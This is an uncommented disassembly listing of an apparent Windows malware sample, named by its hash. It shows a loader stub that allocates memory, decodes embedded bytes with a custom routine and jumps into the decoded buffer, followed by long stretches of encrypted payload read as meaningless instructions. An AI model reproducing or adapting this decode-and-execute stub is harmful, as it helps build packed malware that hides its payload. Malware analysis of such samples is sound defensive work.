
7a0eed78ba67a4f7ef8a400afe04c1b8fbdbcce1f25f7a44db3d90e87c857cde.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	sub    esp,0xf8
  411006:	push   esi
  411007:	mov    esi,DWORD PTR ds:0x42901c
  41100d:	push   edi
  41100e:	push   0x0
  411010:	push   0x80
  411015:	push   0x3
  411017:	push   0x0
  411019:	push   0x0
  41101b:	push   0x80000000
  411020:	push   0x4291e0
  411025:	call   esi
  411027:	mov    edi,eax
  411029:	cmp    edi,0xffffffff
  41102c:	mov    DWORD PTR [esp+0xc],edi
  411030:	je     0x41115f
  411036:	push   0x0
  411038:	push   0x80
  41103d:	push   0x4
  41103f:	push   0x0
  411041:	push   0x1
  411043:	push   0x4
  411045:	push   0x4291d8
  41104a:	call   esi
  41104c:	mov    esi,eax
  41104e:	cmp    esi,0xffffffff
  411051:	jne    0x411061
  411053:	pop    edi
  411054:	mov    eax,0x1
  411059:	pop    esi
  41105a:	add    esp,0xf8
  411060:	ret    
  411061:	push   ebx
  411062:	mov    ebx,DWORD PTR ds:0x429018
  411068:	push   ebp
  411069:	mov    ebp,DWORD PTR ds:0x429014
  41106f:	nop
  411070:	push   0x0
  411072:	lea    eax,[esp+0x14]
  411076:	push   eax
  411077:	push   0xc8
  41107c:	lea    ecx,[esp+0x4c]
  411080:	push   ecx
  411081:	push   edi
  411082:	call   DWORD PTR ds:0x429010
  411088:	test   eax,eax
  41108a:	je     0x4110d1
  41108c:	push   0x2
  41108e:	push   0x0
  411090:	push   0x0
  411092:	push   esi
  411093:	call   ebx
  411095:	mov    edx,DWORD PTR [esp+0x10]
  411099:	push   0x0
  41109b:	push   edx
  41109c:	push   0x0
  41109e:	mov    edi,eax
  4110a0:	push   edi
  4110a1:	push   esi
  4110a2:	call   ebp
  4110a4:	mov    ecx,DWORD PTR [esp+0x10]
  4110a8:	push   0x0
  4110aa:	lea    eax,[esp+0x1c]
  4110ae:	push   eax
  4110af:	push   ecx
  4110b0:	lea    edx,[esp+0x4c]
  4110b4:	push   edx
  4110b5:	push   esi
  4110b6:	call   DWORD PTR ds:0x42900c
  4110bc:	mov    eax,DWORD PTR [esp+0x10]
  4110c0:	push   0x0
  4110c2:	push   eax
  4110c3:	push   0x0
  4110c5:	push   edi
  4110c6:	push   esi
  4110c7:	call   DWORD PTR ds:0x429028
  4110cd:	mov    edi,DWORD PTR [esp+0x14]
  4110d1:	cmp    DWORD PTR [esp+0x10],0xc8
  4110d9:	je     0x411070
  4110db:	push   edi
  4110dc:	mov    edi,DWORD PTR ds:0x429040
  4110e2:	call   edi
  4110e4:	push   esi
  4110e5:	call   edi
  4110e7:	lea    ecx,[esp+0x1c]
  4110eb:	push   ecx
  4110ec:	call   DWORD PTR ds:0x429048
  4110f2:	mov    ecx,DWORD PTR [esp+0x38]
  4110f6:	xor    edx,edx
  4110f8:	mov    eax,0x21c00
  4110fd:	div    ecx
  4110ff:	mov    edi,DWORD PTR ds:0x429118
  411105:	lea    edx,[esp+0x40]
  411109:	mov    ebx,ecx
  41110b:	mov    esi,eax
  41110d:	imul   esi,ecx
  411110:	push   esi
  411111:	push   0x4291a0
  411116:	push   edx
  411117:	call   edi
  411119:	xor    edx,edx
  41111b:	mov    eax,0x21c00
  411120:	div    ebx
  411122:	lea    eax,[esp+0x4c]
  411126:	add    edx,0x400
  41112c:	push   edx
  41112d:	push   0x429178
  411132:	push   eax
  411133:	call   edi
  411135:	push   0x22000
  41113a:	lea    ecx,[esp+0x5c]
  41113e:	push   0x429148
  411143:	push   ecx
  411144:	call   edi
  411146:	mov    edx,0x21c00
  41114b:	sub    edx,esi
  41114d:	push   edx
  41114e:	lea    eax,[esp+0x68]
  411152:	push   0x429120
  411157:	push   eax
  411158:	call   edi
  41115a:	add    esp,0x30
  41115d:	pop    ebp
  41115e:	pop    ebx
  41115f:	pop    edi
  411160:	xor    eax,eax
  411162:	pop    esi
  411163:	add    esp,0xf8
  411169:	ret    
  41116a:	nop
  41116b:	nop
  41116c:	nop
  41116d:	nop
  41116e:	nop
  41116f:	nop
  411170:	sub    esp,0x8
  411173:	push   ebx
  411174:	push   ebp
  411175:	mov    ebp,DWORD PTR [esp+0x20]
  411179:	push   esi
  41117a:	xor    eax,eax
  41117c:	push   edi
  41117d:	mov    edi,DWORD PTR [esp+0x1c]
  411181:	mov    DWORD PTR [esp+0x10],eax
  411185:	mov    esi,0xfffffffd
  41118a:	mov    DWORD PTR [esp+0x14],0x1
  411192:	mov    ecx,DWORD PTR [esp+0x20]
  411196:	mov    cl,BYTE PTR [ecx+esi*1+0x3]
  41119a:	add    esi,0x2
  41119d:	inc    esi
  41119e:	mov    BYTE PTR [esi+edi*1],cl
  4111a1:	movzx  edx,BYTE PTR [eax+ebp*1]
  4111a5:	mov    eax,DWORD PTR [esp+0x10]
  4111a9:	mov    ecx,DWORD PTR [esp+0x14]
  4111ad:	add    eax,ecx
  4111af:	mov    DWORD PTR [esp+0x10],eax
  4111b3:	shr    eax,cl
  4111b5:	mov    eax,DWORD PTR [esp+0x10]
  4111b9:	mov    ecx,eax
  4111bb:	shr    ecx,0x3
  4111be:	mov    ebx,0x1
  4111c3:	sub    ebx,ecx
  4111c5:	imul   eax,ebx
  4111c8:	mov    DWORD PTR [esp+0x10],eax
  4111cc:	shl    ebx,0x3
  4111cf:	mov    bl,BYTE PTR [esi+edi*1]
  4111d2:	mov    ecx,DWORD PTR [esp+0x24]
  4111d6:	add    bl,dl
  4111d8:	mov    BYTE PTR [esi+edi*1],bl
  4111db:	sub    esi,0x2
  4111de:	cmp    esi,ecx
  4111e0:	jl     0x411192
  4111e2:	pop    edi
  4111e3:	pop    esi
  4111e4:	pop    ebp
  4111e5:	pop    ebx
  4111e6:	add    esp,0x8
  4111e9:	ret    
  4111ea:	nop
  4111eb:	nop
  4111ec:	nop
  4111ed:	nop
  4111ee:	nop
  4111ef:	nop
  4111f0:	push   ebp
  4111f1:	mov    ebp,esp
  4111f3:	sub    esp,0x70
  4111f6:	mov    DWORD PTR [ebp-0x48],0x0
  4111fd:	mov    DWORD PTR [ebp-0x18],0x0
  411204:	mov    DWORD PTR [ebp-0x70],0x0
  41120b:	mov    DWORD PTR [ebp-0x60],0x0
  411212:	mov    DWORD PTR [ebp-0x8],0x0
  411219:	mov    DWORD PTR [ebp-0x6c],0x0
  411220:	mov    DWORD PTR [ebp-0x68],0x0
  411227:	mov    DWORD PTR [ebp-0x14],0x0
  41122e:	mov    DWORD PTR [ebp-0x4c],0x0
  411235:	mov    DWORD PTR [ebp-0x10],0x0
  41123c:	mov    DWORD PTR [ebp-0x58],0x0
  411243:	mov    DWORD PTR [ebp-0x4],0x0
  41124a:	mov    DWORD PTR [ebp-0x5c],0x0
  411251:	mov    DWORD PTR [ebp-0x30],0x0
  411258:	mov    DWORD PTR [ebp-0x54],0x0
  41125f:	mov    DWORD PTR [ebp-0x2c],0x0
  411266:	mov    DWORD PTR [ebp-0x50],0x0
  41126d:	mov    DWORD PTR [ebp-0xc],0x0
  411274:	mov    eax,ds:0x42920c
  411279:	mov    DWORD PTR [ebp-0x28],eax
  41127c:	mov    ecx,DWORD PTR ds:0x429210
  411282:	mov    DWORD PTR [ebp-0x24],ecx
  411285:	mov    edx,DWORD PTR ds:0x429214
  41128b:	mov    DWORD PTR [ebp-0x20],edx
  41128e:	mov    al,ds:0x429218
  411293:	mov    BYTE PTR [ebp-0x1c],al
  411296:	mov    ecx,DWORD PTR ds:0x4291fc
  41129c:	mov    DWORD PTR [ebp-0x40],ecx
  41129f:	mov    edx,DWORD PTR ds:0x429200
  4112a5:	mov    DWORD PTR [ebp-0x3c],edx
  4112a8:	mov    eax,ds:0x429204
  4112ad:	mov    DWORD PTR [ebp-0x38],eax
  4112b0:	mov    cx,WORD PTR ds:0x429208
  4112b7:	mov    WORD PTR [ebp-0x34],cx
  4112bb:	mov    dl,BYTE PTR ds:0x42920a
  4112c1:	mov    BYTE PTR [ebp-0x32],dl
  4112c4:	mov    DWORD PTR [ebp-0x30],0x40
  4112cb:	lea    eax,[ebp-0x10]
  4112ce:	push   eax
  4112cf:	push   0x4291e8
  4112d4:	call   DWORD PTR ds:0x429004
  4112da:	test   eax,eax
  4112dc:	je     0x411324
  4112de:	push   0x0
  4112e0:	push   0x0
  4112e2:	push   0x0
  4112e4:	call   DWORD PTR ds:0x429034
  4112ea:	mov    DWORD PTR [ebp-0x14],eax
  4112ed:	lea    ecx,[ebp-0x40]
  4112f0:	push   ecx
  4112f1:	lea    edx,[ebp-0x10]
  4112f4:	push   edx
  4112f5:	call   DWORD PTR ds:0x429000
  4112fb:	test   eax,eax
  4112fd:	je     0x411324
  4112ff:	mov    eax,DWORD PTR [ebp-0x10]
  411302:	add    eax,0x1
  411305:	mov    DWORD PTR [ebp-0x10],eax
  411308:	push   0x14
  41130a:	push   0x0
  41130c:	mov    ecx,DWORD PTR [ebp-0x14]
  41130f:	push   ecx
  411310:	call   DWORD PTR ds:0x429030
  411316:	push   0x0
  411318:	push   0x0
  41131a:	mov    edx,DWORD PTR [ebp-0x14]
  41131d:	push   edx
  41131e:	call   DWORD PTR ds:0x42902c
  411324:	mov    BYTE PTR [ebp-0x40],0x56
  411328:	call   DWORD PTR ds:0x429044
  41132e:	mov    DWORD PTR [ebp-0x2c],eax
  411331:	mov    BYTE PTR [ebp-0x3e],0x72
  411335:	movzx  eax,WORD PTR [ebp-0x2c]
  411339:	cmp    eax,0x539
  41133e:	jne    0x411380
  411340:	mov    BYTE PTR [ebp-0x34],0x0
  411344:	mov    DWORD PTR [ebp-0x14],0xe0d
  41134b:	lea    ecx,[ebp-0x28]
  41134e:	push   ecx
  41134f:	call   DWORD PTR ds:0x429024
  411355:	mov    DWORD PTR [ebp-0x60],eax
  411358:	mov    DWORD PTR [ebp-0x54],0x3a
  41135f:	lea    edx,[ebp-0x40]
  411362:	push   edx
  411363:	mov    eax,DWORD PTR [ebp-0x60]
  411366:	push   eax
  411367:	call   DWORD PTR ds:0x429020
  41136d:	mov    DWORD PTR [ebp-0x44],eax
  411370:	mov    DWORD PTR [ebp-0x8],0x1b947f7a
  411377:	mov    DWORD PTR [ebp-0x68],0x10d93f
  41137e:	jmp    0x411395
  411380:	mov    BYTE PTR ds:0x444a58,0x0
  411387:	mov    BYTE PTR ds:0x42cb88,0x0
  41138e:	mov    BYTE PTR ds:0x442b18,0x0
  411395:	mov    DWORD PTR [ebp-0x2c],0x410000
  41139c:	push   DWORD PTR ds:0x429024
  4113a2:	pop    edx
  4113a3:	mov    DWORD PTR [ebp-0x6c],edx
  4113a6:	push   DWORD PTR [ebp-0x30]
  4113a9:	push   0x1000
  4113ae:	mov    eax,DWORD PTR [ebp-0x14]
  4113b1:	add    eax,0x23
  4113b4:	add    eax,0x23
  4113b7:	push   eax
  4113b8:	xor    eax,eax
  4113ba:	push   eax
  4113bb:	mov    ecx,DWORD PTR [ebp-0x44]
  4113be:	call   ecx
  4113c0:	push   eax
  4113c1:	pop    ecx
  4113c2:	mov    DWORD PTR [ebp-0x4],ecx
  4113c5:	mov    ecx,DWORD PTR [ebp-0x68]
  4113c8:	sub    ecx,0xdae0b
  4113ce:	mov    DWORD PTR [ebp-0x68],ecx
  4113d1:	cmp    DWORD PTR [ebp-0x4],0x0
  4113d5:	jne    0x4113de
  4113d7:	mov    BYTE PTR ds:0x442b18,0x0
  4113de:	mov    edx,DWORD PTR [ebp-0x4]
  4113e1:	add    edx,DWORD PTR [ebp-0x14]
  4113e4:	mov    eax,DWORD PTR [ebp-0x8]
  4113e7:	mov    DWORD PTR [edx],eax
  4113e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ec:	add    ecx,DWORD PTR [ebp-0x54]
  4113ef:	mov    DWORD PTR [ebp-0x5c],ecx
  4113f2:	mov    edx,DWORD PTR ds:0x429020
  4113f8:	mov    DWORD PTR [ebp-0x4c],edx
  4113fb:	mov    eax,DWORD PTR [ebp-0x4]
  4113fe:	add    eax,DWORD PTR [ebp-0x14]
  411401:	mov    ecx,DWORD PTR [ebp+0x8]
  411404:	mov    DWORD PTR [eax+0x4],ecx
  411407:	mov    edx,DWORD PTR [ebp-0x4]
  41140a:	add    edx,DWORD PTR [ebp-0x14]
  41140d:	mov    DWORD PTR [ebp-0xc],edx
  411410:	cmp    DWORD PTR [ebp-0x68],0x0
  411414:	jbe    0x411431
  411416:	mov    eax,DWORD PTR [ebp-0xc]
  411419:	push   eax
  41141a:	mov    ecx,DWORD PTR [ebp-0x14]
  41141d:	push   ecx
  41141e:	mov    edx,DWORD PTR [ebp-0x2c]
  411421:	add    edx,DWORD PTR [ebp-0x68]
  411424:	push   edx
  411425:	mov    eax,DWORD PTR [ebp-0x4]
  411428:	push   eax
  411429:	call   0x411170
  41142e:	add    esp,0x10
  411431:	cmp    DWORD PTR [ebp-0x5c],0x0
  411435:	je     0x411448
  411437:	push   DWORD PTR [ebp-0x4c]
  41143a:	push   DWORD PTR [ebp-0x6c]
  41143d:	mov    edx,DWORD PTR [ebp-0x5c]
  411440:	push   eax
  411441:	jmp    edx
  411443:	jmp    0x422f1d
  411448:	mov    ecx,DWORD PTR [ebp+0x8]
  41144b:	mov    DWORD PTR [ebp-0x18],ecx
  41144e:	jno    0x41143b
  411450:	cmp    edx,DWORD PTR [esp+eax*8-0x77835e65]
  411457:	push   cs
  411458:	push   ecx
  411459:	inc    esi
  41145a:	push   esp
  41145b:	mul    BYTE PTR [ebx]
  41145d:	xor    ch,BYTE PTR [edi-0x6b]
  411460:	loope  0x4114bb
  411462:	out    0xa2,eax
  411464:	add    al,0xb1
  411466:	dec    ebp
  411467:	shr    DWORD PTR [ebp+0x65],1
  41146a:	call   0x4461824f
  41146f:	daa    
  411470:	fisub  DWORD PTR [ecx-0x4dd123cb]
  411476:	adc    al,0xc1
  411478:	inc    ebx
  411479:	imul   esi,DWORD PTR [edi+0x23],0x1cd1a520
  411480:	cs je  0x4114c9
  411483:	dec    ecx
  411484:	mov    cl,BYTE PTR [ebx+ebp*2]
  411487:	cmp    edx,0x2a300492
  41148d:	mov    al,0xf1
  41148f:	dec    esi
  411490:	mov    ebx,ebx
  411492:	xor    al,0x9a
  411494:	gs xchg ax,ax
  411497:	pop    edx
  411498:	xor    bh,BYTE PTR [ebx*2-0x771e25f5]
  41149f:	shl    BYTE PTR [eax+ebp*2-0xc],cl
  4114a3:	and    BYTE PTR [eax],dl
  4114a5:	std    
  4114a6:	mov    al,0xb0
  4114a8:	(bad)  [ebp+0x21]
  4114ab:	push   ebx
  4114ac:	(bad)  
  4114ad:	sub    ebx,DWORD PTR [esi]
  4114af:	in     eax,dx
  4114b0:	xor    BYTE PTR [edx-0x21],bl
  4114b3:	ss push cs
  4114b5:	mov    esp,ecx
  4114b7:	mov    esp,0x5fa6d863
  4114bc:	xchg   edi,eax
  4114bd:	addr16 inc edx
  4114bf:	fidiv  DWORD PTR [edi-0x79241f4d]
  4114c5:	sahf   
  4114c6:	jp     0x4114ac
  4114c8:	enter  0x7b6a,0xe6
  4114cc:	sub    edi,DWORD PTR [ebp+0x57]
  4114cf:	stos   DWORD PTR es:[edi],eax
  4114d0:	dec    BYTE PTR [ebp-0x71]
  4114d3:	cmp    ebp,DWORD PTR [ebx+0x3]
  4114d6:	push   edi
  4114d7:	pop    ds
  4114d8:	ret    0xe0fe
  4114db:	gs sub bl,BYTE PTR fs:[ebx+ebp*1]
  4114e0:	sar    DWORD PTR [eax-0x6d],0x49
  4114e4:	ja     0x41147e
  4114e6:	cwde   
  4114e7:	inc    eax
  4114e8:	mov    esp,ecx
  4114ea:	mov    DWORD PTR ds:0x5342252d,esp
  4114f0:	jo     0x4114d3
  4114f2:	inc    edx
  4114f3:	pop    ds
  4114f4:	dec    ebx
  4114f5:	pop    edi
  4114f6:	xor    eax,0x7e90cae4
  4114fb:	sbb    BYTE PTR [esi+0x14],dh
  4114fe:	leave  
  4114ff:	lods   eax,DWORD PTR ds:[esi]
  411500:	out    dx,al
  411501:	ins    BYTE PTR es:[edi],dx
  411502:	pop    es
  411503:	mov    ebx,0xf8c12e57
  411508:	mov    eax,0x663e2fea
  41150d:	mov    ds:0x2a563345,al
  411512:	mov    ds:0x4f331503,al
  411517:	inc    edx
  411518:	(bad)  
  411519:	or     eax,DWORD PTR [edx]
  41151b:	aam    0x82
  41151d:	xchg   DWORD PTR [eax],eax
  41151f:	pushf  
  411520:	jmp    0x41157b
  411522:	jmp    DWORD PTR [esp+edi*8]
  411525:	adc    al,0xf8
  411527:	sbb    BYTE PTR [esi-0x2b],ah
  41152a:	into   
  41152b:	mov    esp,0x8374fb6f
  411530:	(bad)  
  411532:	int3   
  411533:	fidiv  DWORD PTR [ecx-0x61]
  411536:	ss out dx,al
  411538:	mov    dl,0xe8
  41153a:	pushw  ss
  41153c:	pop    ebp
  41153d:	sub    al,0x27
  41153f:	repz (bad) 
  411541:	jecxz  0x41158b
  411543:	and    al,ch
  411545:	popf   
  411546:	xor    bl,BYTE PTR [ebx]
  411548:	je     0x4114fe
  41154a:	xor    al,0xf9
  41154c:	loopne 0x4115ac
  41154e:	mov    eax,0x5d295e91
  411553:	push   ebx
  411554:	mov    ch,0x32
  411556:	ins    BYTE PTR es:[edi],dx
  411557:	test   BYTE PTR [ebx],0x7b
  41155a:	in     eax,dx
  41155b:	sar    BYTE PTR [eax],0x96
  41155e:	int3   
  41155f:	aad    0x5f
  411561:	lds    ecx,FWORD PTR [ecx-0x45]
  411564:	test   al,0xdb
  411566:	sub    al,0xd3
  411568:	aam    0xd7
  41156a:	xlat   BYTE PTR ds:[ebx]
  41156b:	les    edx,FWORD PTR [ecx]
  41156d:	scas   eax,DWORD PTR es:[edi]
  41156e:	aam    0xde
  411570:	or     DWORD PTR [edx+0x29646eb7],0xb74eed1
  41157a:	pop    esi
  41157b:	clc    
  41157c:	push   ebp
  41157d:	xchg   esp,eax
  41157e:	push   ss
  41157f:	int3   
  411580:	xchg   ebx,eax
  411581:	test   eax,0x8ad18c76
  411586:	cdq    
  411587:	lock mov ch,0x37
  41158a:	(bad)  
  41158b:	or     esp,DWORD PTR [ebp+eiz*8+0x56]
  41158f:	aam    0xe0
  411591:	repz pop esi
  411593:	out    dx,eax
  411594:	or     al,0x7e
  411596:	leave  
  411597:	inc    edi
  411598:	jno    0x4115a7
  41159a:	inc    ecx
  41159b:	mov    dh,0x3c
  41159d:	cmp    al,0x70
  41159f:	mul    ecx
  4115a1:	sahf   
  4115a2:	pop    ecx
  4115a3:	fs inc esi
  4115a5:	(bad)  
  4115a6:	sub    dl,BYTE PTR [ecx]
  4115a8:	fsubr  st(7),st
  4115aa:	push   edx
  4115ab:	jg     0x411581
  4115ad:	in     al,dx
  4115ae:	pusha  
  4115af:	dec    edi
  4115b0:	sub    DWORD PTR [ecx],ebx
  4115b2:	cli    
  4115b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115b4:	mov    al,0x81
  4115b6:	cmc    
  4115b7:	push   ebx
  4115b8:	sti    
  4115b9:	push   ecx
  4115ba:	push   esi
  4115bb:	imul   eax,ebp,0xdb84421b
  4115c1:	pop    esp
  4115c2:	out    0xdd,al
  4115c4:	mov    ebx,0x2d022a4e
  4115c9:	aad    0x16
  4115cb:	xor    DWORD PTR [edi+ebp*1],esp
  4115ce:	pop    ss
  4115cf:	mov    ecx,0xc740960b
  4115d4:	popa   
  4115d5:	daa    
  4115d6:	inc    ebx
  4115d7:	loopne 0x411571
  4115d9:	mov    ebx,0x42d44fee
  4115de:	stos   DWORD PTR es:[edi],eax
  4115df:	mov    ebx,0x75412a2a
  4115e4:	lea    eax,[eax]
  4115e6:	sub    BYTE PTR [ebp+0x7a],al
  4115e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115ea:	jl     0x41157b
  4115ec:	fisubr WORD PTR [esi]
  4115ee:	xor    dl,BYTE PTR [ecx]
  4115f0:	pop    ss
  4115f1:	mov    cl,0xa1
  4115f3:	ret    0x6087
  4115f6:	enter  0x3250,0xe3
  4115fa:	(bad)  
  4115fb:	mov    edi,0xa20b523a
  411600:	(bad)  
  411601:	cwde   
  411602:	mov    ch,0x40
  411604:	cld    
  411605:	imul   ebp,DWORD PTR [esi-0x126f26ca],0xa46238
  41160f:	gs xchg ebp,eax
  411611:	popf   
  411612:	adc    eax,0x96bc67e9
  411617:	jnp    0x411606
  411619:	fxch   st(2)
  41161b:	and    BYTE PTR [eax+0x6365a8b5],cl
  411621:	and    BYTE PTR [edx+0x269c2272],0x3d
  411628:	mov    ebx,0x46057b9f
  41162d:	pop    es
  41162e:	xor    ah,ah
  411630:	mov    eax,ds:0xce926c1e
  411635:	mov    eax,0x48c1c76
  41163a:	mov    ebp,0xe15d6056
  41163f:	mov    dl,0x35
  411641:	(bad)  
  411642:	sbb    dh,0xb3
  411645:	jg     0x48e61e3b
  41164b:	hlt    
  41164c:	inc    esi
  41164d:	cmp    dl,dh
  41164f:	sbb    al,0x35
  411651:	cmp    ebx,ebx
  411653:	cmc    
  411654:	inc    ebx
  411655:	dec    ebp
  411656:	cld    
  411657:	cli    
  411658:	jnp    0x411620
  41165a:	xor    DWORD PTR [edi+0x1052823f],ebx
  411660:	add    eax,0x36ceb7ae
  411665:	mov    eax,0xa0cc37bb
  41166a:	int    0x4d
  41166c:	arpl   bx,bp
  41166e:	in     eax,dx
  41166f:	hlt    
  411670:	loope  0x411607
  411672:	std    
  411673:	mov    esp,0x9436a67
  411678:	jge    0x41160f
  41167a:	cmp    ebp,DWORD PTR [esi-0x5fcc86e4]
  411680:	xor    DWORD PTR [ebx+0x25002f4e],eax
  411686:	cli    
  411687:	iret   
  411688:	shr    DWORD PTR gs:[edi],1
  41168b:	push   ebx
  41168c:	call   0x893d36c9
  411691:	mov    esp,0xcd3c5748
  411696:	out    0xf4,eax
  411698:	adc    bl,BYTE PTR [edi]
  41169a:	lock jmp 0x4116a9
  41169d:	daa    
  41169e:	sub    DWORD PTR [eax],edx
  4116a0:	mov    bh,0x29
  4116a2:	inc    esi
  4116a3:	cdq    
  4116a4:	add    ebx,DWORD PTR [eax-0x24]
  4116a7:	adc    BYTE PTR [esi+0x2dec52ea],0xa7
  4116ae:	(bad)  
  4116af:	out    dx,eax
  4116b0:	cdq    
  4116b1:	ret    0x642b
  4116b4:	push   esi
  4116b5:	repz xor eax,0x9e18da3
  4116bb:	add    ecx,ebx
  4116bd:	inc    esp
  4116be:	lds    edi,FWORD PTR ds:0x102f81a6
  4116c4:	outs   dx,BYTE PTR ds:[esi]
  4116c5:	adc    al,0x13
  4116c8:	icebp  
  4116c9:	fldcw  WORD PTR [edi]
  4116cb:	jle    0x41167f
  4116cd:	je     0x411701
  4116cf:	mov    ch,0x4d
  4116d1:	jp     0x4116c5
  4116d3:	mov    dl,0xb6
  4116d5:	shr    bh,cl
  4116d7:	adc    ebx,DWORD PTR [edx]
  4116d9:	mov    esp,DWORD PTR [ebx+0x4d]
  4116dc:	inc    ebp
  4116dd:	ret    0x1df
  4116e0:	push   eax
  4116e1:	cmc    
  4116e2:	ret    
  4116e3:	jb     0x4116bf
  4116e5:	and    eax,0x9d58b595
  4116ea:	dec    esp
  4116eb:	dec    ebp
  4116ec:	cmp    al,0x32
  4116ee:	mov    bh,0x78
  4116f0:	mov    eax,0x7d1815ad
  4116f5:	inc    esi
  4116f6:	cmp    al,0x7b
  4116f8:	xchg   esi,eax
  4116f9:	ret    
  4116fa:	mov    DWORD PTR [edx],esi
  4116fc:	cmp    esp,DWORD PTR [ebx-0x5]
  4116ff:	not    BYTE PTR [eax]
  411701:	adc    edx,edi
  411703:	push   esi
  411704:	xchg   esi,eax
  411705:	scas   eax,DWORD PTR es:[edi]
  411706:	cli    
  411707:	mov    ds:0xd6c85baf,al
  41170c:	pop    eax
  41170d:	test   eax,0x2ac7e5dc
  411712:	adc    eax,0xcfec2227
  411717:	cmp    al,0x1d
  411719:	in     al,0xed
  41171b:	ret    
  41171c:	mov    BYTE PTR [ebx],0x55
  41171f:	(bad)  
  411720:	addr16 xchg ebp,eax
  411722:	sub    eax,0x9554673d
  411727:	inc    edi
  411728:	pop    ebp
  411729:	pop    esp
  41172b:	sub    eax,0x8e8c2cbf
  411730:	adc    ah,BYTE PTR [ebp-0x64684fed]
  411736:	pop    esp
  411737:	pop    edx
  411738:	dec    ecx
  411739:	inc    edx
  41173a:	jle    0x4116cb
  41173c:	jno    0x4117b6
  41173e:	inc    edi
  41173f:	and    al,cl
  411741:	mov    WORD PTR [ecx-0x78421361],?
  411747:	jno    0x41175f
  411749:	mov    DWORD PTR ds:0xff3f7b89,esi
  41174f:	aad    0x31
  411751:	cmp    DWORD PTR [ebp+esi*8+0x33949614],0x958568e6
  41175c:	pushf  
  41175d:	js     0x4116ec
  41175f:	and    al,0x6
  411761:	cmp    al,0xb
  411763:	or     esi,DWORD PTR [edx+ecx*1]
  411766:	aam    0x61
  411768:	mov    ch,0x72
  41176a:	shr    DWORD PTR [eax+0x7defa928],cl
  411770:	add    BYTE PTR [ebp-0x44],bl
  411773:	loope  0x4117b6
  411775:	push   ebp
  411776:	scas   al,BYTE PTR es:[edi]
  411777:	(bad)  
  411778:	in     al,dx
  411779:	popa   
  41177a:	sbb    BYTE PTR [esi],cl
  41177c:	and    ah,al
  41177e:	fidivr WORD PTR [edi-0x52]
  411781:	and    esi,DWORD PTR ds:0x545c9ec8
  411787:	arpl   WORD PTR [edx+esi*8-0x4a],sp
  41178b:	dec    edi
  41178c:	stos   BYTE PTR es:[edi],al
  41178d:	mov    eax,0x788a11a3
  411792:	or     BYTE PTR [ebp-0x26],0x9f
  411796:	xor    ecx,0x7b175828
  41179c:	pop    es
  41179d:	sub    eax,0x9d92dcba
  4117a2:	data16 xchg BYTE PTR [esi],ch
  4117a5:	and    esp,DWORD PTR [eax+ebp*2+0x69d84c6f]
  4117ac:	das    
  4117ad:	retf   0x5425
  4117b0:	xor    ebx,DWORD PTR [edi-0x80]
  4117b3:	mov    esi,0xa7335103
  4117b8:	ja     0x4117dd
  4117ba:	jmp    0x50e2:0xad0e594a
  4117c1:	fnstsw WORD PTR [eax]
  4117c3:	imul   ebp,DWORD PTR [eax+ebp*2-0x12],0xe90ea81d
  4117cb:	(bad)  
  4117cc:	xor    edi,DWORD PTR [ebx]
  4117ce:	cmp    si,WORD PTR [eax]
  4117d1:	jnp    0x41178e
  4117d3:	sbb    BYTE PTR [ecx+0x33],ch
  4117d6:	int    0xbc
  4117d8:	(bad)  
  4117d9:	mov    bh,ah
  4117db:	mov    ds:0x6acf129,eax
  4117e0:	jle    0x41185c
  4117e2:	loope  0x411827
  4117e4:	stc    
  4117e5:	push   edx
  4117e6:	mov    ebx,0xd8906
  4117eb:	mov    ds:0xee94b4fd,al
  4117f0:	and    DWORD PTR [eax],esp
  4117f2:	scas   eax,DWORD PTR es:[edi]
  4117f3:	es ds xor eax,0xaf36eec7
  4117fa:	(bad)  
  4117fb:	jge    0x4117d1
  4117fd:	inc    ecx
  4117fe:	sub    cl,dh
  411800:	jo     0x411821
  411802:	push   cs
  411803:	mov    gs,WORD PTR [edx]
  411805:	pop    ss
  411806:	sbb    eax,0x7468e30e
  41180b:	fnsave [ecx+0x1a070e0]
  411811:	push   esp
  411812:	rol    BYTE PTR [edx-0x49ae230c],0xe8
  411819:	dec    ebp
  41181a:	icebp  
  41181b:	inc    edx
  41181c:	mov    WORD PTR [ebx],ss
  41181e:	in     al,dx
  41181f:	mov    WORD PTR [edx-0x63],gs
  411822:	mov    ch,0x2d
  411824:	add    al,0x7b
  411826:	fldenv [edi+ecx*4+0x64]
  41182a:	jne    0x4117f4
  41182c:	loope  0x4117c9
  41182e:	js     0x41184c
  411830:	sar    ch,cl
  411832:	adc    al,0x3e
  411834:	mov    esi,DWORD PTR [esi]
  411836:	cmp    DWORD PTR [ecx-0x66],eax
  411839:	cdq    
  41183a:	lods   al,BYTE PTR ds:[esi]
  41183b:	jg     0x4118ab
  41183d:	mov    ecx,0xce207bc9
  411842:	mov    dh,0xb6
  411844:	scas   al,BYTE PTR es:[edi]
  411845:	repnz inc DWORD PTR [ebp-0x73]
  411849:	lds    eax,FWORD PTR [eax-0x61]
  41184c:	dec    edi
  41184d:	pop    edx
  41184e:	xor    eax,0x8b4c2929
  411854:	jp     0x41181c
  411856:	xor    bl,bh
  411858:	sub    bl,0x5e
  41185b:	push   ecx
  41185c:	hlt    
  41185d:	mov    esp,?
  41185f:	jb     0x4118d7
  411861:	push   edi
  411862:	lea    ebp,[esi]
  411864:	gs call 0x634c:0xc33988a2
  41186c:	xor    esp,eax
  41186e:	mov    al,0xb7
  411870:	xchg   esp,eax
  411871:	or     ah,BYTE PTR [edx-0x4fcc9dc3]
  411877:	div    DWORD PTR [esi+0x64]
  41187a:	sub    ch,BYTE PTR [edx]
  41187c:	mov    dh,0x82
  41187e:	xor    bl,ah
  411880:	adc    BYTE PTR [esi-0x54],bh
  411883:	inc    ebx
  411884:	mov    esp,0x48d60a61
  411889:	or     al,0x99
  41188b:	sbb    eax,0xe33ee6d1
  411890:	lahf   
  411891:	fist   WORD PTR [edi]
  411893:	pushw  ds
  411895:	dec    edx
  411896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411897:	and    bh,dl
  411899:	pop    ds
  41189a:	push   edx
  41189b:	push   esp
  41189c:	stos   DWORD PTR es:[edi],eax
  41189d:	adc    eax,0x6ed692e4
  4118a2:	fsub   QWORD PTR [eax]
  4118a4:	pmullw mm4,QWORD PTR [eax]
  4118a7:	cdq    
  4118a8:	sub    al,0x87
  4118aa:	test   eax,0xefe41330
  4118af:	xchg   ebx,eax
  4118b0:	dec    esp
  4118b1:	lea    ebx,[edx]
